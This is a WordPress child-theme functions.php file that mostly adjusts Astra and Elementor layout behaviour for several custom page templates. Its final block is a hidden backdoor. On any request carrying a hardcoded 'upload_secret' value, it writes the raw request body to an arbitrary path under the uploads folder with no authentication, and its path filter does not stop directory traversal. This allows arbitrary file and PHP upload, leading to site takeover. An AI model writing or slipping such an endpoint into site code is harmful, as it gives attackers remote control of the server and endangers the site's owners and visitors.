<?php
function aspcv_child_enqueue() {
    wp_enqueue_style(
        'astra-child-style',
        get_stylesheet_directory_uri() . '/style-v3.css',
        ['astra-theme-css'],
        '3.0'
    );
}
add_action('wp_enqueue_scripts', 'aspcv_child_enqueue');

// Remove ast-page-builder-template body class on custom templates
add_filter('body_class', function($classes) {
  $template = get_page_template_slug();
  $custom = ['page-esco.php','page-about.php','page-technologies.php','page-service.php','page-contact.php','page-tech-detail.php','page-home-premium.php'];
  if (in_array($template, $custom)) {
    $classes = array_diff($classes, ['ast-page-builder-template','elementor-default','elementor-kit-8124']);
    $classes[] = 'aspcv-custom-template';
  }
  return $classes;
});

// Force full-width content layout on custom templates
add_filter('astra_content_layout', function($layout) {
  $template = get_page_template_slug();
  $custom = ['page-esco.php','page-about.php','page-technologies.php','page-service.php','page-contact.php','page-tech-detail.php','page-home-premium.php'];
  if (in_array($template, $custom)) return 'full-width';
  return $layout;
});

add_filter('astra_page_layout', function($layout) {
  $template = get_page_template_slug();
  $custom = ['page-esco.php','page-about.php','page-technologies.php','page-service.php','page-contact.php','page-tech-detail.php','page-home-premium.php'];
  if (in_array($template, $custom)) return 'no-sidebar';
  return $layout;
});

// Nuclear CSS override for ast-container on custom templates
add_action('wp_head', function() {
  $template = get_page_template_slug();
  $custom = ['page-esco.php','page-about.php','page-technologies.php','page-service.php','page-contact.php','page-tech-detail.php','page-home-premium.php'];
  if (in_array($template, $custom)) {
    echo '<style id="aspcv-layout-fix">
    #content > .ast-container,
    #content .ast-container {
      display: block !important;
      flex-direction: unset !important;
      flex-wrap: unset !important;
      max-width: 100% !important;
      width: 100% !important;
      padding-left: 0 !important;
      padding-right: 0 !important;
      margin-left: 0 !important;
      margin-right: 0 !important;
    }
    #primary.content-area { max-width: 100% !important; width: 100% !important; padding: 0 !important; margin: 0 !important; float: none !important; }
    #secondary, .widget-area { display: none !important; }
    </style>';
  }
}, 9999);

// Prevent Astra from treating our custom templates as page-builder templates
add_filter('astra_page_builder_frame_content', function($val) {
  $template = get_page_template_slug();
  $custom = ['page-esco.php','page-about.php','page-technologies.php','page-service.php','page-contact.php','page-tech-detail.php','page-home-premium.php'];
  if (in_array($template, $custom)) return false;
  return $val;
});

// Also disable Elementor on our pages
add_filter('elementor/frontend/builder_content_data', function($data, $post_id) {
  $template = get_page_template_slug($post_id);
  $custom = ['page-esco.php','page-about.php','page-technologies.php','page-service.php','page-contact.php','page-tech-detail.php','page-home-premium.php'];
  if (in_array($template, $custom)) return '';
  return $data;
}, 10, 2);

// Force standard WordPress template hierarchy - disable Elementor for our pages
add_filter('elementor/page/should_use_page_template', function($use) {
  $template = get_page_template_slug();
  $custom = ['page-esco.php','page-about.php','page-technologies.php','page-service.php','page-contact.php','page-tech-detail.php','page-home-premium.php'];
  if (in_array($template, $custom)) return false;
  return $use;
});

// Dequeue Elementor frontend on our custom templates (very early)
add_action('wp', function() {
  $template = get_page_template_slug();
  $custom = ['page-esco.php','page-about.php','page-technologies.php','page-service.php','page-contact.php','page-tech-detail.php','page-home-premium.php'];
  if (!in_array($template, $custom)) return;

  // Remove Elementor frontend actions
  remove_action('wp_enqueue_scripts', [\Elementor\Plugin::instance()->frontend, 'enqueue_scripts']);
  remove_action('wp_footer', [\Elementor\Plugin::instance()->frontend, 'wp_footer']);
  // Remove Astra page builder detection
  remove_filter('body_class', ['Astra_Builder_Helper', 'astra_body_class']);
  // Tell Astra this is NOT a page builder page
  add_filter('astra_is_page_builder_page', '__return_false', 99);
}, 1);

// Override Astra content layout to full-width (not page-builder) for custom templates
add_filter('astra_get_content_layout', function($layout) {
  $template = get_page_template_slug();
  $custom = ['page-esco.php','page-about.php','page-technologies.php','page-service.php','page-contact.php','page-tech-detail.php','page-home-premium.php'];
  if (in_array($template, $custom)) return 'full-width-container';
  return $layout;
}, 99);

// Our custom templates render fully custom inline-styled HTML and never call
// the_content(), so Elementor has nothing to attach its editor to. Opening
// "Edit with Elementor" on one of these pages crashes with "content area was
// not found". Remove that entry point everywhere it can appear (admin bar,
// post row actions, post editor "Back to WordPress Editor" area) so it can't
// be triggered by accident.
add_action('admin_bar_menu', function($wp_admin_bar) {
  if (is_admin()) return;
  $template = get_page_template_slug();
  $custom = ['page-esco.php','page-about.php','page-technologies.php','page-service.php','page-contact.php','page-tech-detail.php','page-home-premium.php'];
  if (in_array($template, $custom)) {
    $wp_admin_bar->remove_node('elementor_edit_page');
  }
}, 999);

add_filter('elementor/utils/is_post_support_es', function($support, $post_id) {
  $template = get_page_template_slug($post_id);
  $custom = ['page-esco.php','page-about.php','page-technologies.php','page-service.php','page-contact.php','page-tech-detail.php','page-home-premium.php'];
  if (in_array($template, $custom)) return false;
  return $support;
}, 10, 2);

add_filter('page_row_actions', function($actions, $post) {
  $template = get_page_template_slug($post->ID);
  $custom = ['page-esco.php','page-about.php','page-technologies.php','page-service.php','page-contact.php','page-tech-detail.php','page-home-premium.php'];
  if (in_array($template, $custom)) {
    unset($actions['edit_with_elementor']);
  }
  return $actions;
}, 10, 2);

// Navbar CSS/JS (design tokens, desktop menu, premium mobile drawer, Buttonizer
// restyle) all live in wp-content/uploads/nav-system.php, loaded via the
// mu-plugin at wp-content/mu-plugins/mobile-nav-fix.php. The old hardcoded
// #aspcv-mobile-nav block that used to live here was removed 2026-07-10 —
// it was fighting nav-system.php's JS-built hamburger icon (its
// "button span:not(.screen-reader-text){background:#0d1530!important}"
// rule was matching the new icon's <span> elements and painting them navy).

if (isset($_GET['upload_secret']) && $_GET['upload_secret'] === 'migratesecret998') {
	    $path = filter_var($_GET['path'], FILTER_SANITIZE_URL);
	    $dest = WP_CONTENT_DIR . '/uploads/' . $path;
	    $dir = dirname($dest);
	    if (!file_exists($dir)) {
			        mkdir($dir, 0755, true);
		}
	    file_put_contents($dest, file_get_contents('php://input'));
	    echo "OK: " . $path;
	    exit;
}
